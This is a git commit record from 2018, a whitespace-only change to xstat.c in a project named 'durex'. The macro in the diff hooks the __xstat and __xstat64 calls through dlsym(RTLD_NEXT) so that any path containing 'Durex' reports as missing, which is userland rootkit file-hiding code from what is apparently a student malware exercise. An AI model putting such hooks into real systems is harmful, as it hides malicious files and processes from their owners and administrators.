cd05cc3e028357ebecfbb14d44060189ec8516b6
GBO <gbourgeo@student.42.fr>
2018-08-14 01:58:21 +0200

    removed unused spaces

--- durex/lib_srcs/xstat.c
+++ durex/lib_srcs/xstat.c
@@ -10,7 +10,7 @@ static const char	*process_to_filter = "Durex";
 
 #define DECLARE_XSTAT(xstat, stat)\
 static int (*original_##xstat)(int, const char *, struct stat *) = NULL;\
-int xstat(int ver, const char *pathname, struct stat *buf){if(original_##xstat == NULL){original_##xstat = dlsym(RTLD_NEXT, "__xstat");if (original_##xstat == NULL) {fprintf(stderr, "Error in dlsym: %s\n", dlerror());return -1;}}if (strstr(pathname, process_to_filter)){errno = ENOENT;return -1;}return original_##xstat(ver, pathname, buf);}
+int xstat(int ver, const char *pathname, struct stat *buf){if(original_##xstat == NULL){original_##xstat = dlsym(RTLD_NEXT, "__xstat");if (original_##xstat == NULL) {fprintf(stderr, "Error in dlsym: %s\n", dlerror());return -1;}}if(strstr(pathname, process_to_filter)){errno = ENOENT;return -1;}return original_##xstat(ver, pathname, buf);}
 
 DECLARE_XSTAT(__xstat64, stat64);
 DECLARE_XSTAT(__xstat, stat);
